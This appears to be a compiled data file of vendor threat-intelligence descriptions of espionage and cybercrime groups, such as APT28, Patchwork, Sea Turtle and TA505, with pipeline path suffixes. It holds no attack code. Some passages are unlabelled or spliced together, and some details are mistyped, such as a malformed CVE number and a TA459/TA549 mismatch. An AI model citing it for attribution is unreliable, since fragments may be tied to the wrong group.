(Symantec) Symantec discovered the Greenbug cyberespionage group during its investigation into previous attacks involving W32.Disttrack.B (aka Shamoon). Shamoon (W32.Disttrack) first made headlines in 2012 when it was used in attacks against energy companies in Saudi Arabia. It recently resurfaced in November 2016 (W32.Disttrack.B), again attacking targets in Saudi Arabia. While these attacks were covered extensively in the media, how the attackers stole these credentials and introduced W32.Disttrack on targeted organizations’ networks remains a mystery. Could Greenbug be responsible for getting Shamoon those stolen credentials? Although there is no definitive link between Greenbug and Shamoon, the group compromised at least one administrator computer within a Shamoon-targeted organization’s network prior to W32.Disttrack.B being deployed on November 17, 2016.

(CyberX) CyberX has discovered a new, large-scale cyber-reconnaissance operation targeting a broad range of targets in the Ukraine. Because it eavesdrops on sensitive conversations by remotely controlling PC microphones – in order to surreptitiously “bug” its targets – and uses Dropbox to store exfiltrated data, CyberX has named it “Operation BugDrop.” CyberX has confirmed at least 70 victims successfully targeted by the operation in a range of sectors including critical infrastructure, media, and scientific research. The operation seeks to capture a range of sensitive information from its targets including audio recordings of conversations, screen shots, documents and passwords. Unlike video recordings, which are often blocked by users simply placing tape over the camera lens, it is virtually impossible to block your computer’s microphone without physically accessing and disabling the PC hardware.

(Kaspersky) Kaspersky Lab has observed new waves of attacks that started on the 8th and the 27th of June 2016. These have been highly active in the Middle East region and unveiled ongoing targeted attacks in multiple regions. The attackers try to lure targets through spear phishing emails that include compressed executables. The malware collects all data such as passwords, keystrokes and screenshots, then sends it to the attackers. We found that the group behind this campaign targeted mainly industrial, engineering and manufacturing organizations in more than 30 countries. In total, over 130 organizations have been identified as victims of this campaign. Using the Kaspersky Security Network (KSN) and artifacts from malware files and attack sites, we were able to trace the attacks back to March 2015. Noteworthy is that since the beginning of their activities, the attackers’ motivations are apparently financial, whether through the victims’ banking accounts or through selling their intellectual property to interested parties, most infiltrated victim organizations are considered SMBs (Small to Medium size businesses, 30-300 employees), the utilization of commercial off-the-shelf malware makes the attribution of the attacks more difficult.

"Description

(Kaspersky) Based on our findings, we believe the attackers represent a previously unknown geopolitically motivated threat actor. The campaign started in 2017, with the attackers doing just enough to achieve their goals. They most likely have access to additional tools when needed and appear to have access to an elaborate database of contacts in sensitive organizations and personnel worldwide, especially of vulnerable and non-trained staff. The victim systems range from personal desktop or laptop systems to large servers with domain controller roles or similar. The nature of the targeted ministries varied, including those responsible for telecommunications, health, energy, justice, finance and so on. Operation Parliament appears to be another symptom of escalating tensions in the Middle East region. The attackers have taken great care to stay under the radar, imitating another attack group in the region. They have been particularly careful to verify victim devices before proceeding with the infection, safeguarding their command and control servers. The targeting seems to have slowed down since the beginning of 2018, probably winding down when the desired data or access was obtained. The targeting of specific victims is unlike previously seen behavior in regional campaigns by Gaza Cybergang or Desert Falcons and points to an elaborate information-gathering exercise that was carried out before the attacks (physical and/or digital)."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|1df57a01d99647368013ab694638c01e

(Symantec) Symantec has identified a previously unknown group called Orangeworm that has been observed installing a custom backdoor called Trojan.Kwampirs within large international corporations that operate within the healthcare sector in the United States, Europe, and Asia. First identified in January 2015, Orangeworm has also conducted targeted attacks against organizations in related industries as part of a larger supply-chain attack in order to reach their intended victims. Known victims include healthcare providers, pharmaceuticals, IT solution providers for healthcare and equipment manufacturers that serve the healthcare industry, likely for the purpose of corporate espionage. Based on the list of known victims, Orangeworm does not select its targets randomly or conduct opportunistic hacking. Rather, the group appears to choose its targets carefully and deliberately, conducting a good amount of planning before launching an attack. According to Symantec telemetry, almost 40 percent of Orangeworm’s confirmed victim organizations operate within the healthcare industry. The Kwampirs malware was found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. Additionally, Orangeworm was observed to have an interest in machines used to assist patients in completing consent forms for required procedures. The exact motives of the group are unclear."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|ff94464739bb4dd18a257b652e0dda60

Description

(Cylance) Snorre Fagerland of Blue Coat Systems first coined the term PassCV in a blog post. His post provides a good introduction to the group and covers some of the older infrastructure, stolen code-signing certificate reuse, and other connections associated with the PassCV malware. There are several clues alluding to the possibility that multiple groups may be utilizing the same stolen signing certificates, but at this time SPEAR believes the current attacks are more likely being perpetrated by a single group employing multiple publicly available Remote Administration Tools (RATs). The PassCV group has been operating with continued success and has already started to expand their malware repertoire into different off-the-shelf RATs and custom code. SPEAR identified eighteen previously undisclosed stolen Authenticode certificates. These certificates were originally issued to companies and individuals scattered across China, Taiwan, Korea, Europe, the United States and Russia. The PassCV group typically utilized publicly available RATs in addition to some custom code, which ultimately provided backdoor functionality to affected systems via phony resumes and curriculum vitae (CVs). PassCV continues to maintain a heavy reliance on obfuscated and signed versions of older RATs like ZxShell and Ghost RAT, which have remained a favorite of the wider Chinese criminal community since their initial public release."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|039825b8f43241de9106b35a36847243

Description

(Cymmetria) Patchwork is a targeted attack that has infected an estimated 2,500 machines since it was first observed in December 2015. There are indications of activity as early as 2014, but Cymmetria has not observed any such activity first hand. Patchwork targets were chosen worldwide with a focus on personnel working on military and political assignments, and specifically those working on issues relating to Southeast Asia and the South China Sea. Many of the targets were governments and government-related organizations. The code used by this threat actor is copy-pasted from various online forums, in a way that reminds us of a patchwork quilt –hence the name we’ve given the operation. In active victim systems, Patchwork immediately searches for and uploads documents to their C&C, and only if the target is deemed valuable enough, proceeds to install a more advanced second stage malware. This group seems to be associated with Confucius.

Observed

Sectors: Aviation, Defense, Energy, Financial, Government, IT, Media, NGOs, Pharmaceutical and Think Tanks. Countries: China, Japan, Middle East, UK, USA and Southeast Asia, many of the target countries are in the area surrounding the Indian subcontinent (Bangladesh, Sri Lanka and Pakistan).

The attack was detected as part of a spear phishing against a government organization in Europe in late May 2016. The target was an employee working on Chinese policy research and the attack vector was a PowerPoint presentation file. The content of the presentation was on issues relating to Chinese activity in the South China Sea. <https://s3-us-west-2.amazonaws.com/cymmetriablog/public/Unveiling_Patchwork.pdf>

Mar 2018

Targeting US Think Tanks In March and April 2018, Volexity identified multiple spear phishing campaigns attributed to Patchwork, an Indian APT group also known as Dropping Elephant. This increase in threat activity was consistent with other observations documented over the last few months in blogs by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend Micro noting targets in South Asia.

Description

(Airbus) Pitty Tiger is a group of attackers that have been active since at least 2011. They have targeted private companies in several sectors, such as defense and telecommunications, but also at least one government. We have been able to track down this group of attackers and can provide detailed information about them. We were able to collect and reveal their “malware arsenal”. We also analyzed their technical organization. Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far, rather they prefer using custom malware, developed for the group’s exclusive usage. Our discoveries indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar, yet still not as mature as other groups of attackers we monitor. Pitty Tiger is probably not a state-sponsored group of attackers. They lack the experience and financial support that one would expect from state-sponsored attackers. We suppose this group is opportunistic and sells its services to probable competitors of their targets in the private sector. We have been able to leverage several attackers profiles, showing that the Pitty Tiger group is fairly small compared to other APT groups, which is probably why we saw them work on a very limited amount of targets.

Description

(Microsoft) Platinum has been targeting its victims since at least as early as 2009, and may have been active for several years prior. Its activities are distinctly different not only from those typically seen in untargeted attacks, but from many targeted attacks as well. A large share of targeted attacks can be characterized as opportunistic: the activity group changes its target profiles and attack geographies based on geopolitical seasons, and may attack institutions all over the world. Like many such groups, Platinum seeks to steal sensitive intellectual property related to government interests, but its range of preferred targets is consistently limited to specific governmental organizations, defense institutes, intelligence agencies, diplomatic institutions, and telecommunication providers in South and Southeast Asia. The group’s persistent use of spear-phishing tactics (phishing attempts aimed at specific individuals) and access to previously undiscovered zero-day exploits have made it a highly resilient threat.

Since the 2016 publication, Microsoft has come across an evolution of PLATINUM’s file-transfer tool, one that uses the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel for communication. This channel works independently of the operating system (OS), rendering any communication over it invisible to firewall and network monitoring applications running on the host device. Until this incident, no malware had been discovered misusing the AMT SOL feature for communication. <https://www.microsoft.com/security/blog/2017/06/07/platinumcontinues-to-evolve-find-ways-to-maintain-invisibility>

(Kaspersky) During the latter part of 2015, Kaspersky researchers from GreAT (Global Research and Analysis Team) got hold of the missing pieces of an intricate puzzle that points to the dawn of the first Portuguese-speaking targeted attack group, named “Poseidon.” The group’s campaigns appear to have been active since at least 2005, while the very first sample found points to 2001. This signals just how long ago the Poseidon threat actor was already working on its offensive framework. The Poseidon Group is a long-running team operating on all domains: land, air, and sea. They are dedicated to running targeted attacks campaigns to aggressively collect information from company networks through the use of spear-phishing packaged with embedded, executable elements inside office documents and extensive lateral movement tools. The information exfiltrated is then leveraged by a company front to blackmail victim companies into contracting the Poseidon Group as a security firm. Even when contracted, the Poseidon Group may continue its infection or initiate another infection at a later time, persisting on the network to continue data collection beyond its contractual obligation. The Poseidon Group has been active, using custom code and evolving their toolkit since at least 2005. Their tools are consistently designed to function on English and Portuguese systems spanning the gamut of Windows OS, and their exfiltration methods include the use of hijacked satellite connections.|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|2cef30f92f5448109028756f0b29b25f

Promethium is an activity group that has been active since at least 2012. The group conducted a campaign in May 2016 and has heavily targeted Turkish victims. Promethium has demonstrated similarity to another activity group called Neodymium due to overlapping victim and campaign characteristics. (Microsoft) Promethium is an activity group that has been active as early as 2012. The group primarily uses Truvasys, a first-stage malware that has been in circulation for several years. Truvasys has been involved in several attack campaigns, where it has masqueraded as one of server common computer utilities, including WinUtils, TrueCrypt, WinRAR, or SanDisk. In each of the campaigns, Truvasys malware evolved with additional features—this shows a close relationship between the activity groups behind the campaigns and the developers of the malware.

Description

(Palo Alto) Throughout 2017 and 2018 Unit 42 has been tracking and observing a series of highly targeted attacks focused in South East Asia, building on our research into the KHRAT Trojan. Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families. In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen. Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes. We believe this group is previously unidentified and therefore have we have dubbed it “Rancor”. The Rancor group’s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers’ toolkit.

Description

(ESET) There are several groups actively and profitably targeting businesses in Russia. A trend that we have seen unfold before our eyes lately is these cybercriminals’ use of simple backdoors to gain a foothold in their targets’ networks. Once they have this access, a lot of the work is done manually, slowly getting to understand the network layout and deploying custom tools the criminals can use to steal funds from these entities. Some of the groups that best exemplify these trends are Buhtrap, Cobalt Group and Corkow, Metel. The group discussed in this white paper is part of this new trend. We call this new group RTM; it uses custom malware, written in Delphi, that we cover in detail in later sections. The first trace of this tool in our telemetry data dates back to late 2015. The group also makes use of several different modules that they deploy where appropriate to their targets. They are interested in users of remote banking systems (RBS), mainly in Russia and neighboring countries.

Observed

Description

Sandworm Team is a Russian cyberespionage group that has operated since approximately 2009. The group likely consists of Russian pro-hacktivists. Sandworm Team targets mainly Ukrainian entities associated with energy, industrial control systems, SCADA, government, and media. Sandworm Team has been linked to the Ukrainian energy sector attack in late 2015. This group appears to be closely associated with, or evolved into, TeleBots.

Widespread power outages on the Ukraine The power outage was described as technical failures taking place on Wednesday, December 23 that impacted a region around IvanoFrankivisk Oblast. One report suggested the utility began to disconnect power substations for no apparent reason. The same report goes on to describe a virus was launched from the outside and it brought down the “remote management system” (a reference to the SCADA and or EMS). The outage was reported to have lasted six hours before electrical service was restored. At least two reports suggest the utility had initiated manual controls for restoration of service and the SCADA system was still off-line due to the infection. <https://ics.sans.org/blog/2015/12/30/current-reporting-on-the-cyberattack-in-ukraine-resulting-in-power-outage>

Description

(CrowdStrike) Samurai Panda is interesting in that their target selection tends to focus on Asia Pacific victims in Japan, the Republic of Korea, and other democratic Asian victims. Beginning in 2009, we’ve observed this actor conduct more than 40 unique campaigns that we’ve identified in the malware configurations’ campaign codes. These codes are often leveraged in the malware used by coordinated targeted attackers to differentiate victims that were successfully compromised from different target sets. The implant delivered by Samurai Panda uses a typical installation process whereby they: 1. Leverage a spear-phish with an exploit to get control of the execution flow of the targeted application. This file “drops” an XOR-encoded payload that unpacks itself and a configuration file. 2. Next, the implant, which can perform in several different modes, typically will install itself as a service and then begin beaconing out to an adversarycontrolled host. 3. If that command-and-control host is online, the malicious service will download and instantiate a backdoor that provides remote access to the attacker, who will see the infected host’s identification information as well as the campaign code.

Description

(Kaspersky) A few of months ago, we deployed a new set of technologies into our products designed to identify and block zero day attacks. These technologies already proved its effectiveness earlier this year, when they caught an Adobe Flash zero day exploit, CVE-2016-1010. Earlier this month, we caught another zero-day Adobe Flash Player exploit deployed in targeted attacks. We believe these attacks are launched by an APT Group we call “ScarCruft”. ScarCruft is a relatively new APT group; victims have been observed in several countries, including Russia, Nepal, South Korea, China, India, Kuwait and Romania. The group has several ongoing operations utilizing multiple exploits — two for Adobe Flash and one for Microsoft Internet Explorer. Currently, the group is engaged in two major operations: Operation Daybreak and Operation Erebus. The first of them, Operation Daybreak, appears to have been launched by ScarCruft in March 2016 and employs a previously unknown (0-day) Adobe Flash Player exploit, focusing on high profile victims. The other one, “Operation Erebus” employs an older exploit, for CVE-2016-4117 and leverages watering holes. It is also possible that the group deployed another zero day exploit, CVE-2016-0147, which was patched in April.

We recently discovered some interesting telemetry on this actor, and decided to dig deeper into ScarCruft’s recent activity. This shows that the actor is still very active and constantly trying to elaborate its attack tools. Based on our telemetry, we can reassemble ScarCruft’s binary infection procedure. It used a multi-stage binary infection to update each module effectively and evade detection. <https://securelist.com/scarcruft-continues-to-evolve-introducesbluetooth-harvester/90729/>

Description

Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group’s motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by Scarlet Mimic and Putter Panda, APT 2, it has not been concluded that the groups are the same. (Palo Alto) The attacks began over four years ago and their targeting pattern suggests that this adversary’s primary mission is to gather information about minority rights activists. We do not have evidence directly linking these attacks to a government source, but the information derived from these activities supports an assessment that a group or groups with motivations similar to the stated position of the Chinese government in relation to these targets is involved. The attacks we attribute to Scarlet Mimic have primarily targeted Uyghur and Tibetan activists as well as those who are interested in their causes. Both the Tibetan community and the Uyghurs, a Turkic Muslim minority residing primarily in northwest China, have been targets of multiple sophisticated attacks in the past decade. Both also have history of strained relationships with the government of the People’s Republic of China (PRC), though we do not have evidence that links Scarlet Mimic attacks to the PRC."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|1b98fba192db48e89f0685b356ee1916
"Scarlet Mimic attacks have also been identified against government organizations in Russia and India, who are responsible for tracking activist and terrorist activities. While we do not know the precise target of each of the Scarlet Mimic attacks, many of them align to the patterns described above.

Description

(Talos) Cisco Talos has discovered a new cyber threat campaign that we are calling “Sea Turtle,” which is targeting public and private entities, including national security organizations, located primarily in the Middle East and North Africa. The ongoing operation likely began as early as January 2017 and has continued through the first quarter of 2019. Our investigation revealed that at least 40 different organizations across 13 different countries were compromised during this campaign. We assess with high confidence that this activity is being carried out by an advanced, state-sponsored actor that seeks to obtain persistent access to sensitive networks and systems. The actors behind this campaign have focused on using DNS hijacking as a mechanism for achieving their ultimate objectives. DNS hijacking occurs when the actor can illicitly modify DNS name records to point users to actor-controlled servers. The Department of Homeland Security (DHS) issued an alert about this activity on Jan. 24 2019, warning that an attacker could redirect user traffic and obtain valid encryption certificates for an organization’s domain names.

While the gang had previously targeted Russian banks, Group-IB experts also have discovered evidence of the group's activity in more than 25 countries worldwide. Group-IB has published its first detailed report on tactics and tools employed by Silence. Group-IB security analysts' hypothesis is that at least one of the gang members appears to be a former or current employee of a cyber security company. The confirmed damage from Silence activity is estimated at 800 000 USD. Silence is a group of Russian-speaking hackers, based on their commands language, the location of infrastructure they used, and the geography of their targets (Russia, Ukraine, Belarus, Azerbaijan, Poland, and Kazakhstan). Although phishing emails were also sent to bank employees in Central and Western Europe, Africa, and Asia). Furthermore, Silence used Russian words typed on an English keyboard layout for the commands of the employed backdoor. The hackers also used Russian-language web hosting services.

Description

In February 2016, Iran-focused individuals received messages purporting to be from Human RightsWatch's (HRW) Emergencies Director, requesting that they read an article about Iran pressing Afghan refugees to fight in Syria. While referencing a real report published by HRW, the links provided for the Director’s biography and article directed the recipient to malware hosted elsewhere. These spear-phishing attempts represent an evolution of Iranian actors based on their social engineering tactics and narrow targeting. Although the messages still had minor grammatical and stylistic errors that would be obvious to a native speaker, the actors demonstrated stronger English-language proficiency than past intrusion sets and a deeper investment in background research prior to the attempt. The actors appropriated a real identity that would be expected to professionally interact with the subject, then offered validation through links to their biography and social media, the former of which itself was malware as well. The bait documents contained a real article relevant to their interests and topic referenced, and the message attempted to address to how it aligned with their professional research or field of employment. The referenced documents sent were malware binaries posing as legitimate files using the common right-to-left filenames tactic in order to conceal the actual file extension."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|3531148991de4b8a828b0e94fe2f93d0
"All of these techniques, while common pretexting mechanisms, are a refinement compared to a tendency amongst other groups to simply continually send different forms of generic malware or phishing, in the hopes that one would eventually be successful.

This turned out to be a malicious loader internally named ‘Slingshot’, part of a new, and highly sophisticated attack platform that rivals Project Sauron and Regin in complexity. While for most victims the infection vector for Slingshot remains unknown, we were able to find several cases where the attackers got access to MikroTik routers and placed a component downloaded by Winbox Loader, a management suite for MikroTik routers. In turn, this infected the administrator of the router. We believe this cluster of activity started in at least 2012 and was still active at the time of this analysis (February 2018).

Description

(Cylance) While investigating some of the smaller name servers that Sofacy, APT 28, Fancy Bear, Sednit routinely use to host their infrastructure, Cylance discovered another prolonged campaign that appeared to exclusively target Japanese companies and individuals that began around August 2016. The later registration style was eerily close to previously registered APT28 domains, however, the malware used in the attacks did not seem to line up at all. During the course of our investigation, JPCERT published this analysis of one of the group’s backdoors. Cylance tracks this threat group internally as ‘Snake Wine’. The Snake Wine group has proven to be highly adaptable and has continued to adopt new tactics in order to establish footholds inside victim environments. The exclusive interest in Japanese government, education, and commerce will likely continue into the future as the group is just starting to build and utilize their existing current attack infrastructure.

(GData) The revelation about the existence of yet another potentially nation-state driven spyware occurred in March 2014 when Le Monde first published information about top secret slides originating from 2011 and part of their content . But the slides Le Monde published revealed only a small part of the picture – several slides were cut out, some information was redacted. Germany’s Der Spiegel re-published the slide set with far less deletions recently, in January 2015, and therefore gave a deeper insight about what CSEC actually says they have tracked down. The newly published documents reveal: the so called operation SNOWGLOBE, was discovered in 2009 (slide 9) and consists of three different “implants”, two were dubbed snowballs and one “more sophisticated implant, discovered in mid-2010” is tagged as snowman (slide 7). According to slide 22, “CSEC assesses, with moderate certainty, SNOWGLOBE to be a state-sponsored CNO [Cyber Network Operation] effort, put forth by a French intelligence agency.” The information given dates back to 2011 and nothing else has been published since. Now that specific Babar samples have been identified and analyzed, there might be new information, also with regards to similarities or differences between the two Remote Administration Tools (RATs) EvilBunny and Babar.

Description

APT 28 is a threat group that has been attributed to Russia’s Main Intelligence Directorate of the Russian General Staff by a July 2018 U.S. Department of Justice indictment. This group reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election. APT 28 has been active since at least January 2007. (FireEye) APT28 likely seeks to collect intelligence about Georgia’s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense. APT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion. APT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.

Back in 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as its first stage malware. The implant shared certain similarities with the old Miniduke implants. This led us to believe the two groups were connected, at least to begin with, although it appears they parted ways in 2014, with the original Miniduke group switching to the CosmicDuke implant.

"2013

At some point during 2013, the Sofacy group expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across four to five generations) and a few others. We’ve seen quite a few versions of these implants and they were relatively widespread for a time.

On March 10, phishing emails that were mainly directed at old email addresses of 2008 Democratic campaign staffers began to arrive. One of these accounts may have yielded up to date contact lists. The next day, phishing attacks expanded to the non-public email addresses of high level Democratic Party officials. Hillaryclinton.com addresses were attacked, but required two factor authentication for access. The attack redirected towards Gmail accounts on March 19th. Podesta’s Gmail account was breached the same day, with 50,000 emails stolen.

The attack resembles the earlier World Anti-Doping Agency (WADA) leaks.

Description

(Symantec) Symantec has identified a previously unknown group called Sowbug that has been conducting highly targeted cyberattacks against organizations in South America and Southeast Asia and appears to be heavily focused on foreign policy institutions and diplomatic targets. Sowbug has been seen mounting classic espionage attacks by stealing documents from the organizations it infiltrates. Symantec saw the first evidence of Sowbug-related activity with the discovery in March 2017 of an entirely new piece of malware called Felismus used against a target in Southeast Asia. We have subsequently identified further victims on both sides of the Pacific Ocean. While the Felismus tool was first identified in March of this year, its association with Sowbug was unknown until now. Symantec has also been able to connect earlier attack campaigns with Sowbug, demonstrating that it has been active since at least early-2015 and may have been operating even earlier. To date, Sowbug appears to be focused mainly on government entities in South America and Southeast Asia and has infiltrated organizations in Argentina, Brazil, Ecuador, Peru, Brunei and Malaysia. The group is well resourced, capable of infiltrating multiple targets simultaneously and will often operate outside the working hours of targeted organizations in order to maintain a low profile.

Description

(Raytheon) The group appears to have close ties to the Chinese National University of Defense and Technology, which is possibly linked to the PLA. Stalker Panda has been observed conducting targeted attacks against Japan, Taiwan, Hong Kong, and the United States. The attacks appear to be centered on political, media, and engineering sectors. The group appears to have been active since around 2010 and they maintain and upgrade their tools regularly. A fairly unique aspect of the observed Stalker Panda attacks is their use of social media and blog sites as first stage (cutout) command and control (C2) infrastructure. This 2-stage C2 infrastructure provides some obfuscation of the main C2 servers and provides some flexibility in communications because the first stage social media/blog site nodes can be reconfigured at will. Stalker Panda seems to favor spear phishing email campaigns as their attack vector.

Description

(Citizen Lab) This report describes a campaign of targeted spyware attacks carried out by a sophisticated operator, which we call Stealth Falcon. The attacks have been conducted from 2012 until the present, against Emirati journalists, activists, and dissidents. We discovered this campaign when an individual purporting to be from an apparently fictitious organization called “The Right to Fight” contacted Rori Donaghy. Donaghy, a UK-based journalist and founder of the Emirates Center for Human Rights, received a spyware-laden email in November 2015, purporting to offer him a position on a human rights panel. Donaghy has written critically of the United Arab Emirates (UAE) government in the past, and had recently published a series of articles based on leaked emails involving members of the UAE government. Circumstantial evidence suggests a link between Stealth Falcon and the UAE government. We traced digital artifacts used in this campaign to links sent from an activist’s Twitter account in December 2012, a period when it appears to have been under government control.

(ASERT) ASERT has learned of an APT campaign, possibly originating from DPRK, we are calling Stolen Pencil that is targeting academic institutions since at least May 2018. The ultimate motivation behind the attacks is unclear, but the threat actors are adept at scavenging for credentials. Targets are sent spear phishing e-mails that lead them to a web site displaying a lure document and are immediately prompted to install a malicious Google Chrome extension. Once gaining a foothold, the threat actors use off-the-shelf tools to ensure persistence, including Remote Desktop Protocol (RDP) to maintain access. Key Findings  A wide variety of phishing domains imply other targets, but those focused on academia were intended to install a malicious Chrome extension.  A large number of the victims, across multiple universities, had expertise in biomedical engineering, possibly suggesting a motivation for the attackers targeting.  Poor OPSEC led to users finding open web browsers in Korean, English-toKorean translators open, and keyboards switched to Korean.  The threat actors use built-in Windows administration tools and commercial offthe-shelf software to “live off the land”. The threat actor at the keyboard uses RDP to access compromised systems rather than a backdoor or Remote Access Trojan (RAT).  Post-exploitation persistence is maintained by harvesting passwords from a wide variety of sources such as process memory, web browsers, network sniffing, and keyloggers.|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|4d2ce3f972044ef3a459eaeb0c7a116d

Description

(Symantec) Strider has been active since at least October 2011. The group has maintained a low profile until now and its targets have been mainly organizations and individuals that would be of interest to a nation state’s intelligence services. Symantec obtained a sample of the group’s Remsec malware from a customer who submitted it following its detection by our behavioral engine. Remsec is primarily designed to spy on targets. It opens a back door on an infected computer, can log keystrokes, and steal files. Strider has been highly selective in its choice of targets and, to date, Symantec has found evidence of infections in 36 computers across seven separate organizations. The group’s targets include a number of organizations and individuals located in Russia, an airline in China, an organization in Sweden, and an embassy in Belgium.

Information theft and espionage

Description

(Symantec) In March 2016, Symantec published a blog on Suckfly, an advanced cyberespionage group that conducted attacks against a number of South Korean organizations to steal digital certificates. Since then we have identified a number of attacks over a two-year period, beginning in April 2014, which we attribute to Suckfly. The attacks targeted high-profile targets, including government and commercial organizations. These attacks occurred in several different countries, but our investigation revealed that the primary targets were individuals and organizations primarily located in India. While there have been several Suckfly campaigns that infected organizations with the group’s custom malware Backdoor.Nidiran, the Indian targets show a greater amount of post-infection activity than targets in other regions. This suggests that these attacks were part of a planned operation against specific targets in India.

Many of the targets we identified were well known commercial organizations located in India. <https://www.symantec.com/connect/blogs/indian-organizationstargeted-suckfly-attacks>

Late 2015

We discovered Suckfly, an advanced threat group, conducting targeted attacks using multiple stolen certificates, as well as hacktools and custom malware. The group had obtained the certificates through pre-attack operations before commencing targeted attacks against a number of government and commercial organizations spread across multiple continents over a two-year period. This type of activity and the malicious use of stolen certificates emphasizes the importance of safeguarding certificates to prevent them from being used maliciously. <https://www.symantec.com/connect/blogs/suckfly-revealing-secretlife-your-code-signing-certificates>

Description

(Proofpoint) On April 20 [2017], Proofpoint observed a targeted campaign focused on financial analysts working at top global financial firms operating in Russia and neighboring countries. These analysts were linked by their coverage of the telecommunications industry, making this targeting very similar to, and likely a continuation of, activity described in our “In Pursuit of Optical Fibers and Troop Intel” blog. This time, however, attackers opportunistically used spear-phishing emails with a Microsoft Word attachment exploiting the recently patched CVE-20170199 to deploy the ZeroT Trojan, which in turn downloaded the PlugX Remote Access Trojan (RAT). Proofpoint is tracking this attacker, believed to operate out of China, as TA459. The actor typically targets Central Asian countries, Russia, Belarus, Mongolia, and others. TA549 possesses a diverse malware arsenal including PlugX, NetTraveler, and ZeroT.

(Proofpoint) Proofpoint researchers track a wide range of threat actors involved in both financially motivated cybercrime and state-sponsored actions. One of the more prolific actors that we track - referred to as TA505 - is responsible for the largest malicious spam campaigns we have ever observed, distributing instances of the Dridex banking Trojan, Locky ransomware, Jaff ransomware, The Trick banking Trojan, and several others in very high volumes. Because TA505 is such a significant part of the email threat landscape, this blog provides a retrospective on the shifting malware, payloads, and campaigns associated with this actor. We examine their use malware such as Jaff, Bart, and Rockloader that appear to be exclusive to this group as well as more widely distributed malware like Dridex and Pony. Where possible, we detail the affiliate models with which they are involved and outline the current state of TA505 campaigns. TA505 is arguably one of the most significant financially motivated threat actors because of the extraordinary volumes of messages they send. The variety of malware delivered by the group also demonstrates their deep connections to the underground malware scene. At the time of writing, Locky ransomware remains their malware of choice, even as the group continues to experiment with a variety of additional malware."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|d20cf476a0b8459f90bc3819ff4f4fe7

Information theft and espionage

Description

(Trend Micro) The Taidoor attackers have been actively engaging in targeted attacks since at least March 4, 2009. Despite some exceptions, the Taidoor campaign often used Taiwanese IP addresses as C&C servers and email addresses to send out socially engineered emails with malware as attachments. One of the primary targets of the Taidoor campaign appeared to be the Taiwanese government. The attackers spoofed Taiwanese government email addresses to send out socially engineered emails in the Chinese language that typically leveraged Taiwan-themed issues. The attackers actively sent out malicious documents and maintained several IP addresses for command and control. As part of their social engineering ploy, the Taidoor attackers attach a decoy document to their emails that, when opened, displays the contents of a legitimate document but executes a malicious payload in the background. We were only able to gather a limited amount of information regarding the Taidoor attackers’ activities after they have compromised a target. We did, however, find that the Taidoor malware allowed attackers to operate an interactive shell on compromised computers and to upload and download files. In order to determine the operational capabilities of the attackers behind the Taidoor campaign, we monitored a compromised honeypot."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|07fe0d0ad48845aba7063674464fc71e
"The attackers issued out some basic commands in an attempt to map out the extent of the network compromise but quickly realized that the honeypot was not an intended targeted and so promptly disabled the Taidoor malware running on it. This indicated that while Taidoor malware were more widely distributed compared with those tied to other targeted campaigns, the attackers could quickly assess their targets and distinguish these from inadvertently compromised computers and honeypots.

Description

(Kaspersky) Researchers have uncovered a long-term cyber-espionage campaign that used a combination of legitimate software packages and commodity malware tools to target a variety of heavy industry, government intelligence agencies and political activists. Known as the TeamSpy crew because of its affinity for using the legitimate TeamViewer application as part of its toolset, the attackers may have been active for as long as 10 years, researchers say. The attack appears to be a years-long espionage campaign, but experts who have analyzed the victim profile, malware components and command-and-control infrastructure say that it’s not entirely clear what kind of data the attackers are going after. What is clear, though, is that the attackers have been at this for a long time and that they have specific people in mind as targets. Researchers at the CrySyS Lab in Hungary were alerted by the Hungarian National Security Authority to an attack against a high-profile target in the country and began looking into the campaign. They quickly discovered that some of the infrastructure being used in the attack had been in use for some time and that the target they were investigating was by no means the only one.

Description

(ESET) In the second half of 2016, ESET researchers identified a unique malicious toolset that was used in targeted cyberattacks against high-value targets in the Ukrainian financial sector. We believe that the main goal of attackers using these tools is cybersabotage. This blog post outlines the details about the campaign that we discovered. We will refer to the gang behind the malware as TeleBots. However it’s important to say that these attackers, and the toolset used, share a number of similarities with the BlackEnergy group, which conducted attacks against the energy industry in Ukraine in December 2015 and January 2016. In fact, we think that the BlackEnergy group has evolved into the TeleBots group. This group appears to be closely associated with, or evolved from, Sandworm Team, Iron Viking, Voodoo Bear.

